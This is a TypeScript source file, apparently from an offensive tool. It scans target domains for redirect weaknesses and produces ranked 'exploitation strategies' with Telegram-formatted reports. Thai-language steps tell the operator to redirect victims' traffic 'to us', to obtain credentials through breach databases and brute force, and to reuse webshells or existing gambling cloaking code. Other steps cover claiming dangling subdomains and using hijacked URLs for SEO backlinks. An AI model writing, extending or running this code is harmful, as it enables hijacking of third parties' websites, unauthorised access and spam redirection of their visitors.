      evidenceParts.push(`${r.method}: status=${r.statusCode}${r.redirectTo ? ` redirect→${r.redirectTo}` : ""}${r.hasGambling ? " [GAMBLING]" : ""} diff=${r.bodyDiffPercent.toFixed(0)}%`);
    }
  }

  const evidence = detected 
    ? `Geo-cloaking detected (${cloakingType}): normal=${normalStatus}${normalGambling.has ? " [GAMBLING]" : ""} vs ${evidenceParts.join("; ")}`
    : "No cloaking detected";

  // Create vulnerability if cloaking detected
  if (detected) {
    const cloakedRedirectTarget = cloakedResponses.find(r => r.redirectTo)?.redirectTo || null;
    vulns.push({
      type: "geo_cloaking",
      severity: "critical",
      location: `Geo-cloaking (${cloakingType})`,
      vulnerableUrl: scanUrl,
      currentDestination: cloakedRedirectTarget,
      exploitable: true,
      exploitStrategy: cloakingType === "user_agent"
        ? `เว็บใช้ User-Agent cloaking — แสดง gambling content เฉพาะ bot/crawler. เปลี่ยน cloaking code ให้ redirect ไปที่เรา`
        : cloakingType === "geo_ip"
        ? `เว็บใช้ GeoIP cloaking — redirect เฉพาะ IP ไทย. แก้ไข PHP/JS cloaking code เปลี่ยน destination`
        : `เว็บใช้ combined cloaking (UA + GeoIP). แก้ไข cloaking logic ให้ redirect ไปที่เรา`,
      confidence: 85,
      evidence,
      details: `Cloaking type: ${cloakingType}. Normal: status=${normalStatus}, gambling=${normalGambling.has}. ` +
        `Cloaked: ${cloakedResponses.filter(r => r.hasGambling || r.redirectTo).map(r => `${r.method}=${r.statusCode}`).join(", ")}. ` +
        `Gambling keywords: ${uniqueGamblingKeywords.slice(0, 10).join(", ")}`,
    });
  }

  const result: GeoCloakingResult = {
    detected,
    cloakingType,
    normalResponse: {
      statusCode: normalStatus,
      bodyLength: normalBody.length,
      hasGambling: normalGambling.has,
      redirectTo: normalRedirect,
    },
    cloakedResponses,
    gamblingKeywordsFound: uniqueGamblingKeywords,
    evidence,
  };

  return { result, vulns };
}

// ═══════════════════════════════════════════════════════
//  STRATEGY BUILDER
// ═══════════════════════════════════════════════════════

function buildExploitationStrategies(
  vulns: RedirectVulnerability[],
): ExploitationStrategy[] {
  const strategies: ExploitationStrategy[] = [];

  // Strategy 1: Open Redirect (easiest — no access needed)
  const openRedirects = vulns.filter(v => v.type === "open_redirect_param" || v.type === "oauth_redirect_abuse");
  if (openRedirects.length > 0) {
    strategies.push({
      id: "open_redirect_exploit",
      name: "Open Redirect Exploitation",
      description: `ใช้ Open Redirect ที่พบ ${openRedirects.length} จุด เพื่อสร้าง URL ที่ redirect ไปที่เรา`,
      exploitsVulns: openRedirects.map((_, i) => vulns.indexOf(openRedirects[i])),
      successProbability: 95,
      steps: [
        "สร้าง URL ด้วย redirect parameter ที่ชี้ไปเว็บเรา",
        "URL จะอยู่บน domain เป้าหมาย แต่ redirect ไปที่เรา",
        "ใช้ URL นี้ใน SEO backlinks, social media, etc.",
      ],
      requiredAccess: "none",
    });
  }

  // Strategy 2: Dangling CNAME Takeover (no access needed — just claim the service)
  const danglingCnames = vulns.filter(v => v.type === "dangling_cname");
  if (danglingCnames.length > 0) {
    strategies.push({
      id: "cname_takeover",
      name: "Dangling CNAME Subdomain Takeover",
      description: `Claim ${danglingCnames.length} dangling subdomain(s) ที่ชี้ไป service ที่ไม่มีใคร claim`,
      exploitsVulns: danglingCnames.map((_, i) => vulns.indexOf(danglingCnames[i])),
      successProbability: 85,
      steps: [
        "สร้าง project บน service ที่ CNAME ชี้ไป (GitHub Pages, Heroku, etc.)",
        "Configure project ให้ใช้ domain ที่ dangling",
        "Deploy redirect page บน project นั้น",
      ],
      requiredAccess: "none",
    });
  }

  // Strategy 3: Expired Domain in Chain (register the domain)
  const expiredDomains = vulns.filter(v => v.type === "expired_domain_in_chain");
  if (expiredDomains.length > 0) {
    strategies.push({
      id: "expired_domain_claim",
      name: "Expired Domain Registration",
      description: `จดทะเบียน ${expiredDomains.length} domain ที่หมดอายุใน redirect chain`,
      exploitsVulns: expiredDomains.map((_, i) => vulns.indexOf(expiredDomains[i])),
      successProbability: 80,
      steps: [
        "ตรวจสอบว่า domain available สำหรับจดทะเบียน",
        "จดทะเบียน domain",
        "Setup redirect ไปที่เว็บเรา",
      ],
      requiredAccess: "none",
    });
  }

  // Strategy 4: Redirect Takeover (needs access — use existing attack modules)
  const serverRedirects = vulns.filter(v => 
    v.type === "header_redirect" || v.type === "htaccess_redirect" || 
    v.type === "meta_refresh_redirect" || v.type === "js_redirect" ||
    v.type === "content_injection"
  );
  if (serverRedirects.length > 0) {
    strategies.push({
      id: "server_redirect_takeover",
      name: "Server-Side Redirect Takeover",
      description: `เปลี่ยน redirect ที่มีอยู่ ${serverRedirects.length} จุด ให้ชี้มาที่เรา`,
      exploitsVulns: serverRedirects.map((_, i) => vulns.indexOf(serverRedirects[i])),
      successProbability: 60,
      steps: [
        "ใช้ credential hunt (breach DB, brute force) หา access",
        "Login ผ่าน FTP/SSH/cPanel/WP Admin",
        "แก้ไข redirect rules (.htaccess, JS, meta, PHP) ให้ชี้มาที่เรา",
        "Verify redirect ทำงานถูกต้อง",
      ],
      requiredAccess: "medium",
    });
  }

  // Strategy 5: WP Plugin Redirect Manipulation
  const wpPluginVulns = vulns.filter(v => v.type === "wp_redirect_plugin" || v.type === "wp_rest_redirect");
  if (wpPluginVulns.length > 0) {
    strategies.push({
      id: "wp_plugin_redirect",
      name: "WordPress Redirect Plugin Manipulation",
      description: `แก้ไข redirect rules ผ่าน WP redirect plugin ${wpPluginVulns.length} ตัว`,
      exploitsVulns: wpPluginVulns.map((_, i) => vulns.indexOf(wpPluginVulns[i])),
      successProbability: 55,
      steps: [
        "หา WP admin credentials (brute force/breach/XMLRPC)",
        "Login WP Admin",
        "เข้า redirect plugin settings",
        "เพิ่ม/แก้ไข redirect rules ให้ชี้มาที่เรา",
      ],
      requiredAccess: "medium",
    });
  }

  // Strategy 6: PHP Code Exploitation (use existing backdoors/injections)
  const phpVulns = vulns.filter(v => 
    v.type === "php_code_injection" || v.type === "php_backdoor" || v.type === "php_cloaking"
  );
  if (phpVulns.length > 0) {
    const hasBackdoor = phpVulns.some(v => v.type === "php_backdoor");
    const hasCloaking = phpVulns.some(v => v.type === "php_cloaking");
    strategies.push({
      id: "php_code_exploit",
      name: hasBackdoor ? "PHP Backdoor Exploitation" : hasCloaking ? "PHP Cloaking Takeover" : "PHP Code Injection Exploit",
      description: hasBackdoor 
        ? `พบ backdoor/webshell ${phpVulns.length} จุด — ใช้ backdoor เดิมเพื่อ inject redirect code`
        : hasCloaking
        ? `พบ cloaking code ${phpVulns.length} จุด — แก้ไข cloaking ให้ redirect ทุก traffic มาที่เรา`
        : `พบ PHP code injection ${phpVulns.length} จุด — แก้ไข redirect destination`,
      exploitsVulns: phpVulns.map((_, i) => vulns.indexOf(phpVulns[i])),
      successProbability: hasBackdoor ? 75 : 60,
      steps: hasBackdoor ? [
        "ใช้ backdoor/webshell ที่พบเพื่อ execute commands",
        "แก้ไข index.php / .htaccess ให้ redirect มาที่เรา",
        "Verify redirect ทำงานถูกต้อง",
      ] : [
        "วิเคราะห์ PHP code ที่พบ (decode base64/gzinflate)",
        "หา access ผ่าน FTP/SSH/cPanel/WP Admin",
        "แก้ไข PHP redirect code ให้ชี้มาที่เรา",
        "Verify redirect ทำงานถูกต้อง",
      ],
      requiredAccess: hasBackdoor ? "low" : "medium",
    });
  }

  // Strategy 7: Path-specific redirect takeover
  const pathVulns = vulns.filter(v => v.type === "path_specific_redirect");
  if (pathVulns.length > 0) {
    strategies.push({
      id: "path_redirect_takeover",
      name: "Path-Specific Redirect Takeover",
      description: `เปลี่ยน redirect ที่ ${pathVulns.length} path(s) ให้ชี้มาที่เรา`,
      exploitsVulns: pathVulns.map((_, i) => vulns.indexOf(pathVulns[i])),
      successProbability: 65,
      steps: [
        "หา access ผ่าน credential hunt (breach DB, brute force)",
        "แก้ไข redirect rules เฉพาะ path ที่พบ",
        "ใช้ .htaccess RewriteRule หรือ PHP header() เปลี่ยน destination",
        "Verify redirect ทำงานถูกต้อง",
      ],
      requiredAccess: "medium",
    });
  }

  // Strategy 8: Geo-Cloaking Takeover (site already has cloaking code — replace destination)
  const geoCloakingVulns = vulns.filter(v => v.type === "geo_cloaking");
  if (geoCloakingVulns.length > 0) {
    strategies.push({
      id: "geo_cloaking_takeover",
      name: "Geo-Cloaking Redirect Takeover",
      description: `เว็บมี cloaking code อยู่แล้ว (ถูกคนอื่น exploit) — เปลี่ยน redirect destination ให้ชี้มาที่เรา`,
      exploitsVulns: geoCloakingVulns.map((_, i) => vulns.indexOf(geoCloakingVulns[i])),
      successProbability: 80,
      steps: [
        "หา access ผ่าน credential hunt (breach DB, brute force, FTP/SSH/cPanel)",
        "หาไฟล์ cloaking code (มักอยู่ใน index.php, .htaccess, wp-config.php)",
        "แก้ไข redirect destination URL ใน cloaking code ให้ชี้มาที่เรา",
        "Verify: ทดสอบด้วย Thai IP + Googlebot UA ว่า redirect ไปที่เราแล้ว",
      ],
      requiredAccess: "medium",
    });
  }

  // Sort by success probability
  strategies.sort((a, b) => b.successProbability - a.successProbability);
  return strategies;
}

// ═══════════════════════════════════════════════════════
//  MAIN SCANNER
// ═══════════════════════════════════════════════════════

export type DeepRedirectScanProgress = (phase: string, detail: string) => void;

/**
 * Run deep redirect vulnerability scan on a target domain
 * 
 * @param domain - Target domain (e.g., "example.com")
 * @param onProgress - Optional progress callback
 * @returns Comprehensive scan result with vulnerabilities and exploitation strategies
 */
export async function runDeepRedirectScan(
  domain: string,
  onProgress?: DeepRedirectScanProgress,
  targetUrl?: string,
): Promise<DeepRedirectScanResult> {
  const start = Date.now();
  const baseUrl = `https://${domain}`;
  const progress = onProgress || (() => {});
  const allVulns: RedirectVulnerability[] = [];

  progress("init", `🔍 เริ่ม Deep Redirect Scan: ${domain}`);

  // ── Run all scans in parallel (with timeout) ──
  // Extract path from targetUrl if provided
  const targetPaths: string[] = [];
  if (targetUrl) {
    try {
      const parsed = new URL(targetUrl);
      if (parsed.pathname && parsed.pathname !== "/") {
        targetPaths.push(parsed.pathname);
      }
    } catch {}
  }

  progress("scan", `📡 สแกน 10 ประเภทพร้อมกัน...${targetPaths.length > 0 ? ` (+ path: ${targetPaths.join(", ")})` : ""}`);

  const [
    chainResult,
    openRedirectVulns,
    wpPluginResult,
    configVulns,
    clientSideVulns,
    dnsVulns,
    oauthVulns,
    phpResult,
    pathResult,
    geoCloakingResult,
  ] = await Promise.allSettled([
    // Scan 1: Redirect chain (do first — gives us current redirect info)
    (async () => {
      progress("chain", "🔗 วิเคราะห์ redirect chain...");
      return scanRedirectChain(targetUrl || baseUrl);
    })(),
    // Scan 2: Open redirect params
    (async () => {
      progress("open_redirect", "🎯 สแกน Open Redirect parameters...");
      return scanOpenRedirectParams(baseUrl, domain);
    })(),
    // Scan 3: WP redirect plugins
    (async () => {
      progress("wp_plugins", "🔌 ตรวจหา WP Redirect Plugins...");
      return scanWpRedirectPlugins(baseUrl);
    })(),
    // Scan 4: Config file redirects
    (async () => {
      progress("config", "📄 สแกน .htaccess / web.config...");
      return scanConfigRedirects(baseUrl);
    })(),
    // Scan 5: Client-side redirects
    (async () => {
      progress("client_side", "🌐 สแกน Meta/JS redirects...");
      return scanClientSideRedirects(baseUrl, domain);
    })(),
    // Scan 6: DNS dangling
    (async () => {
      progress("dns", "🌍 สแกน DNS CNAME dangling...");
      return scanDanglingDns(domain);
    })(),
    // Scan 7: OAuth/Login redirect abuse
    (async () => {
      progress("oauth", "🔐 สแกน OAuth/Login redirect abuse...");
      return scanOAuthRedirectAbuse(baseUrl, domain);
    })(),
    // Scan 8: PHP index code detection
    (async () => {
      progress("php", "🐘 สแกน PHP code ที่หน้า index + key pages...");
      return scanPhpIndexCode(baseUrl, domain, targetPaths);
    })(),
    // Scan 9: Path-specific redirects
    (async () => {
      if (targetPaths.length === 0) return { pathRedirects: [] as PathRedirectInfo[], vulns: [] as RedirectVulnerability[] };
      progress("path", `📍 สแกน redirect เฉพาะ path: ${targetPaths.join(", ")}...`);
      return scanPathSpecificRedirects(baseUrl, domain, targetPaths);
    })(),
    // Scan 10: Geo-cloaking detection
    (async () => {
      progress("geo_cloaking", "🌏 สแกน Geo-Cloaking (UA/GeoIP)...");
      return scanGeoCloaking(baseUrl, domain, targetUrl);
    })(),
  ]);

  // Collect results
  let redirectChain: RedirectChainHop[] = [];
  if (chainResult.status === "fulfilled") {
    redirectChain = chainResult.value.chain;
    allVulns.push(...chainResult.value.vulns);
  }
  if (openRedirectVulns.status === "fulfilled") allVulns.push(...openRedirectVulns.value);
  
  let detectedRedirectPlugins: string[] = [];
  if (wpPluginResult.status === "fulfilled") {
    detectedRedirectPlugins = wpPluginResult.value.plugins;
    allVulns.push(...wpPluginResult.value.vulns);
  }
  if (configVulns.status === "fulfilled") allVulns.push(...configVulns.value);
  if (clientSideVulns.status === "fulfilled") allVulns.push(...clientSideVulns.value);
  if (dnsVulns.status === "fulfilled") allVulns.push(...dnsVulns.value);
  if (oauthVulns.status === "fulfilled") allVulns.push(...oauthVulns.value);

  // Collect PHP scan results
  let phpCodeFindings: PhpCodeFinding[] = [];
  if (phpResult.status === "fulfilled") {
    phpCodeFindings = phpResult.value.findings;
    allVulns.push(...phpResult.value.vulns);
  }

  // Collect path-specific results
  let pathRedirects: PathRedirectInfo[] = [];
  if (pathResult.status === "fulfilled") {
    pathRedirects = pathResult.value.pathRedirects;
    allVulns.push(...pathResult.value.vulns);
  }

  // Collect geo-cloaking results
  let geoCloaking: GeoCloakingResult | null = null;
  if (geoCloakingResult.status === "fulfilled") {
    geoCloaking = geoCloakingResult.value.result;
    allVulns.push(...geoCloakingResult.value.vulns);
  }

  // Deduplicate by location + type
  const seen = new Set<string>();
  const uniqueVulns = allVulns.filter(v => {
    const key = `${v.type}:${v.location}:${v.currentDestination}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });

  // Sort by severity then confidence
  const severityOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
  uniqueVulns.sort((a, b) => {
    const sevDiff = severityOrder[a.severity] - severityOrder[b.severity];
    if (sevDiff !== 0) return sevDiff;
    return b.confidence - a.confidence;
  });

  // Determine current redirect state
  const isCurrentlyRedirecting = redirectChain.length > 1 && redirectChain[0].redirectType !== "none";
  const currentRedirectDestination = isCurrentlyRedirecting ? redirectChain[redirectChain.length - 1].url : null;

  // Detect CMS from chain
  let detectedCms: string | null = null;
  for (const hop of redirectChain) {
    if (hop.server?.toLowerCase().includes("wordpress")) detectedCms = "wordpress";
  }
  // Also check from WP plugin detection
  if (detectedRedirectPlugins.length > 0) detectedCms = "wordpress";

  // Build exploitation strategies
  const strategies = buildExploitationStrategies(uniqueVulns);
  const topStrategy = strategies.length > 0 ? strategies[0] : null;

  // Build summary
  const criticalCount = uniqueVulns.filter(v => v.severity === "critical").length;
  const highCount = uniqueVulns.filter(v => v.severity === "high").length;
  const exploitableCount = uniqueVulns.filter(v => v.exploitable).length;

  let summary = `🔍 Deep Redirect Scan: ${domain}${targetUrl ? ` (🎯 ${targetUrl})` : ""}\n`;
  summary += `━━━━━━━━━━━━━━━━━━━━\n`;
  summary += `📊 พบ ${uniqueVulns.length} ช่องโหว่ redirect`;
  if (criticalCount > 0) summary += ` (🔴 ${criticalCount} critical)`;
  if (highCount > 0) summary += ` (🟠 ${highCount} high)`;
  summary += `\n`;
  summary += `🎯 Exploitable: ${exploitableCount}/${uniqueVulns.length}\n`;
  if (isCurrentlyRedirecting) {
    summary += `🔗 กำลัง redirect ไป: ${currentRedirectDestination}\n`;
    summary += `📍 Chain: ${redirectChain.map(h => extractDomain(h.url)).join(" → ")}\n`;
  }
  if (detectedRedirectPlugins.length > 0) {
    summary += `🔌 WP Redirect Plugins: ${detectedRedirectPlugins.join(", ")}\n`;
  }
  if (phpCodeFindings.length > 0) {
    const critPhp = phpCodeFindings.filter(f => f.severity === "critical").length;
    summary += `🐘 PHP Code: พบ ${phpCodeFindings.length} patterns`;
    if (critPhp > 0) summary += ` (🔴 ${critPhp} critical)`;
    summary += `\n`;
  }
  if (pathRedirects.length > 0) {
    for (const pr of pathRedirects) {
      if (pr.isRedirecting) {
        summary += `📍 Path ${pr.path}: redirect ${pr.redirectType} → ${pr.destination}\n`;
      } else if (pr.hasGamblingContent) {
        summary += `📍 Path ${pr.path}: gambling content พบ!\n`;
      }
    }
  }
  if (geoCloaking && geoCloaking.detected) {
    summary += `🌏 Geo-Cloaking: ${geoCloaking.cloakingType} detected!`;
    if (geoCloaking.gamblingKeywordsFound.length > 0) {
      summary += ` 🎰 Keywords: ${geoCloaking.gamblingKeywordsFound.slice(0, 3).join(", ")}`;
    }
    summary += `\n`;
  }
  if (topStrategy) {
    summary += `\n🏆 Top Strategy: ${topStrategy.name}\n`;
    summary += `   ${topStrategy.description}\n`;
    summary += `   สำเร็จ: ~${topStrategy.successProbability}% | Access: ${topStrategy.requiredAccess}\n`;
  }
  summary += `\n⏱️ Scan: ${((Date.now() - start) / 1000).toFixed(1)}s`;

  progress("complete", summary);

  return {
    domain,
    scanStarted: start,
    scanDuration: Date.now() - start,
    vulnerabilities: uniqueVulns,
    isCurrentlyRedirecting,
    currentRedirectDestination,
    redirectChain,
    detectedCms,
    detectedRedirectPlugins,
    summary,
    topStrategy,
    strategies,
    phpCodeFindings,
    pathRedirects,
    targetUrl: targetUrl || null,
    geoCloaking,
  };
}

// ═══════════════════════════════════════════════════════
//  FORMAT FOR TELEGRAM
// ═══════════════════════════════════════════════════════

export function formatDeepRedirectScanForTelegram(result: DeepRedirectScanResult): string {
  const severityEmoji: Record<string, string> = { critical: "🔴", high: "🟠", medium: "🟡", low: "🟢", info: "ℹ️" };

  let msg = `🔍 Deep Redirect Scan: ${result.domain}${result.targetUrl ? ` (🎯 ${result.targetUrl})` : ""}\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;

  if (result.isCurrentlyRedirecting) {
    msg += `🔗 **กำลัง redirect ไป:**\n`;
    msg += `   ${result.currentRedirectDestination}\n`;
    msg += `   Chain: ${result.redirectChain.map(h => `${h.redirectType === "none" ? "🏁" : `${h.statusCode}`} ${extractDomain(h.url)}`).join(" → ")}\n\n`;
  }

  // PHP Code Findings section
  if (result.phpCodeFindings && result.phpCodeFindings.length > 0) {
    msg += `🐘 **PHP Code Detection:**\n`;
    for (const f of result.phpCodeFindings.slice(0, 5)) {
      msg += `${severityEmoji[f.severity]} [${f.severity.toUpperCase()}] ${f.pattern}\n`;
      msg += `   📍 ${f.foundAt}\n`;
      msg += `   💡 ${f.analysis}\n`;
      if (f.codeSnippet) msg += `   📝 \`${f.codeSnippet.slice(0, 80)}${f.codeSnippet.length > 80 ? "..." : ""}\`\n`;
      msg += `\n`;
    }
    if (result.phpCodeFindings.length > 5) {
      msg += `... และอีก ${result.phpCodeFindings.length - 5} patterns\n\n`;
    }
  }

  // Path-specific redirect section
  if (result.pathRedirects && result.pathRedirects.length > 0) {
    msg += `📍 **Path-Specific Redirects:**\n`;
    for (const pr of result.pathRedirects) {
      if (pr.isRedirecting) {
        msg += `   🔀 ${pr.path} → ${pr.destination} (${pr.redirectType})\n`;
      } else {
        msg += `   ✅ ${pr.path} — ไม่ redirect\n`;
      }
      if (pr.hasGamblingContent) {
        msg += `   🎰 Gambling content พบที่ path นี้!\n`;
      }
      if (pr.phpCodeFound.length > 0) {
        msg += `   🐘 PHP code: ${pr.phpCodeFound.map(f => f.pattern).join(", ")}\n`;
      }
    }
    msg += `\n`;
  }

  // Geo-Cloaking section
  if (result.geoCloaking && result.geoCloaking.detected) {
    msg += `🌏 **Geo-Cloaking Detection:**\n`;
    msg += `   ⚠️ ตรวจพบ ${result.geoCloaking.cloakingType}!\n`;
    msg += `   📱 Normal: status ${result.geoCloaking.normalResponse.statusCode}, ${result.geoCloaking.normalResponse.bodyLength} bytes`;
    if (result.geoCloaking.normalResponse.hasGambling) msg += ` 🎰`;
    if (result.geoCloaking.normalResponse.redirectTo) msg += ` → ${result.geoCloaking.normalResponse.redirectTo}`;
    msg += `\n`;
    for (const cr of result.geoCloaking.cloakedResponses) {
      const isDifferent = cr.bodyDiffPercent > 30 || cr.hasGambling || cr.redirectTo !== result.geoCloaking.normalResponse.redirectTo;
      if (isDifferent) {
        msg += `   🔀 ${cr.method}: status ${cr.statusCode}, ${cr.bodyLength} bytes`;
        if (cr.hasGambling) msg += ` 🎰`;
        if (cr.redirectTo) msg += ` → ${cr.redirectTo}`;
        msg += `\n`;
      }
    }
    if (result.geoCloaking.gamblingKeywordsFound.length > 0) {
      msg += `   🎰 Keywords: ${result.geoCloaking.gamblingKeywordsFound.slice(0, 5).join(", ")}\n`;
    }
    msg += `\n`;
  }

  if (result.vulnerabilities.length === 0) {
    msg += `✅ ไม่พบช่องโหว่ redirect\n`;
  } else {
    msg += `📊 พบ ${result.vulnerabilities.length} ช่องโหว่:\n\n`;
    for (const v of result.vulnerabilities.slice(0, 8)) { // Limit to 8 for Telegram
      msg += `${severityEmoji[v.severity]} [${v.severity.toUpperCase()}] ${v.type}\n`;
      msg += `   📍 ${v.location}\n`;
      if (v.currentDestination) msg += `   🎯 → ${v.currentDestination}\n`;
      msg += `   💡 ${v.exploitStrategy.slice(0, 100)}${v.exploitStrategy.length > 100 ? "..." : ""}\n`;
      msg += `   🎲 Confidence: ${v.confidence}%\n\n`;
    }
    if (result.vulnerabilities.length > 8) {
      msg += `... และอีก ${result.vulnerabilities.length - 8} ช่องโหว่\n\n`;
    }
  }

  if (result.strategies.length > 0) {
    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `🏆 Exploitation Strategies:\n\n`;
    for (const s of result.strategies.slice(0, 3)) {
      msg += `${s.successProbability >= 80 ? "🟢" : s.successProbability >= 50 ? "🟡" : "🔴"} ${s.name} (~${s.successProbability}%)\n`;
      msg += `   ${s.description}\n`;
      msg += `   Access: ${s.requiredAccess}\n\n`;
    }
  }

  msg += `⏱️ Scan: ${(result.scanDuration / 1000).toFixed(1)}s`;
  return msg;
}
